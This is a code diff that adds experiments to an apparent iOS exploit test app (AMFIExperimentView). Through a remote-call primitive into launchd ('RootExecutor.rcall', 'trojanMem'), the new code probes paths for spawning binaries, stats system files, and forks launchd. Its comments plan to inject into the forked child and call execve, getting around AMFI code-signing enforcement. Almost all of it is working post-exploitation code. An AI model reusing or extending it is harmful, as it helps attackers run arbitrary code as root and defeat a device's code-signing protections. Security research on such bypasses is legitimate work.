@@ -143,6 +143,39 @@ struct AMFIExperimentView: View {
             let exp8 = self.expPosixSpawnAttr(rc: rc)
             experimentResults.append(exp8)
             
+            // ============================================
+            // Experiment 9: PATH VARIANTS — the key test!
+            // ret=2 means ENOENT (not found), so try different paths
+            // ============================================
+            let pathVariants = [
+                "/private/var/bin/id",
+                "/private/usr/bin/id",
+                "/System/usr/bin/id",
+                "/usr/local/bin/id",
+            ]
+            for path in pathVariants {
+                let exp = self.expPosixSpawn(rc: rc, binary: path, name: "spawn \(path)")
+                experimentResults.append(exp)
+            }
+            
+            // ============================================
+            // Experiment 10: Check what launchd sees as root filesystem
+            // ============================================
+            let exp10 = self.expCheckRootFS(rc: rc)
+            experimentResults.append(exp10)
+            
+            // ============================================
+            // Experiment 11: stat() binaries to check they exist
+            // ============================================
+            let exp11 = self.expStatBinaries(rc: rc)
+            experimentResults.append(exp11)
+            
+            // ============================================
+            // Experiment 12: Try fork+execve pattern
+            // ============================================
+            let exp12 = self.expForkExec(rc: rc)
+            experimentResults.append(exp12)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -365,6 +398,108 @@ struct AMFIExperimentView: View {
             name: "access(/usr/bin/id, X_OK)",
             success: canExec,
             detail: canExec ? "✅ Binary is executable (access check passed)" : "❌ Not executable: errno=\(remote_errno(rc))",
+            timestamp: Date()
+        )
+    }
+    
+    /// Experiment: Check root filesystem from launchd's perspective
+    private func expCheckRootFS(rc: RemoteCall) -> ExperimentResult {
+        // getcwd to see launchd's working directory
+        let bufAddr = rc.trojanMem + 0xC00
+        RootExecutor.rcall(rc, "getcwd", bufAddr, 1024)
+        var cwdBuf = [UInt8](repeating: 0, count: 256)
+        rc.remoteRead(bufAddr, to: &cwdBuf, size: 256)
+        let cwd = String(cString: cwdBuf + [0])
+        
+        // stat /usr/bin to check if it exists
+        let statAddr = rc.trojanMem + 0x800
+        let usrBinAddr = remote_alloc_str(rc, "/usr/bin")
+        let statResult = RootExecutor.rcall(rc, "stat", usrBinAddr, statAddr)
+        RootExecutor.rcall(rc, "free", usrBinAddr)
+        
+        // stat /bin
+        let binAddr = remote_alloc_str(rc, "/bin")
+        let binStat = RootExecutor.rcall(rc, "stat", binAddr, statAddr)
+        RootExecutor.rcall(rc, "free", binAddr)
+        
+        // readlink /usr/bin (might be symlink)
+        let linkBuf = rc.trojanMem + 0xD00
+        let linkTarget = remote_alloc_str(rc, "/usr/bin")
+        let linkLen = RootExecutor.rcall(rc, "readlink", linkTarget, linkBuf, 256)
+        var linkStr = ""
+        if linkLen > 0 && linkLen < 256 {
+            var lbuf = [UInt8](repeating: 0, count: Int(linkLen))
+            rc.remoteRead(linkBuf, to: &lbuf, size: linkLen)
+            linkStr = String(bytes: lbuf, encoding: .utf8) ?? ""
+        }
+        RootExecutor.rcall(rc, "free", linkTarget)
+        
+        let detail = """
+        cwd: \(cwd)
+        stat /usr/bin: \(statResult == 0 ? "EXISTS" : "MISSING (errno=\(remote_errno(rc)))")
+        stat /bin: \(binStat == 0 ? "EXISTS" : "MISSING")
+        readlink /usr/bin: \(linkStr.isEmpty ? "(not a symlink)" : linkStr)
+        """
+        
+        return ExperimentResult(name: "rootfs check", success: true, detail: detail, timestamp: Date())
+    }
+    
+    /// Experiment: stat individual binaries
+    private func expStatBinaries(rc: RemoteCall) -> ExperimentResult {
+        let binaries = ["/usr/bin/id", "/bin/sh", "/bin/ls", "/sbin/mount", "/usr/sbin/sysctl"]
+        var results: [String] = []
+        
+        let statAddr = rc.trojanMem + 0x800
+        for bin in binaries {
+            let pathAddr = remote_alloc_str(rc, bin)
+            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
+            results.append("\(bin): \(ret == 0 ? "✅ exists" : "❌ missing")")
+            RootExecutor.rcall(rc, "free", pathAddr)
+        }
+        
+        let allExist = !results.contains(where: { $0.contains("❌") })
+        return ExperimentResult(
+            name: "stat binaries",
+            success: allExist,
+            detail: results.joined(separator: "\n"),
+            timestamp: Date()
+        )
+    }
+    
+    /// Experiment: fork() then execve in child
+    /// This is the classic Unix pattern: fork → child calls execve
+    /// Since fork works, maybe execve in the CHILD works too
+    private func expForkExec(rc: RemoteCall) -> ExperimentResult {
+        // fork()
+        let childPid = RootExecutor.rcall(rc, "fork")
+        
+        if childPid == 0 {
+            // We're somehow in child context (shouldn't happen via RC)
+            return ExperimentResult(name: "fork+exec", success: false, detail: "Unexpected: in child", timestamp: Date())
+        }
+        
+        guard childPid != UInt64(bitPattern: -1) else {
+            return ExperimentResult(name: "fork+exec", success: false, detail: "fork failed", timestamp: Date())
+        }
+        
+        // We're in parent (launchd). Child was forked with PID=childPid.
+        // The child is a copy of launchd — it inherits everything.
+        // But we can't control the child via RC (RC controls parent thread).
+        
+        // Wait for child (it will exit immediately since it's a fork of our thread state)
+        let statusAddr = rc.trojanMem + 0x380
+        rc[statusAddr].setValue32(0)
+        let waitResult = RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, UInt64(WNOHANG))
+        let exitStatus = rc[statusAddr].value32()
+        
+        // The key insight: child PID exists! If we could inject code into it
+        // (via RemoteCall to the child), we could call execve there.
+        // execve in child won't kill launchd!
+        
+        return ExperimentResult(
+            name: "fork+exec",
+            success: true,
+            detail: "✅ fork PID=\(childPid), wait=\(waitResult), status=0x\(String(format: "%x", exitStatus))\n→ Child exists! Could RC into child then execve",
             timestamp: Date()
         )
     }
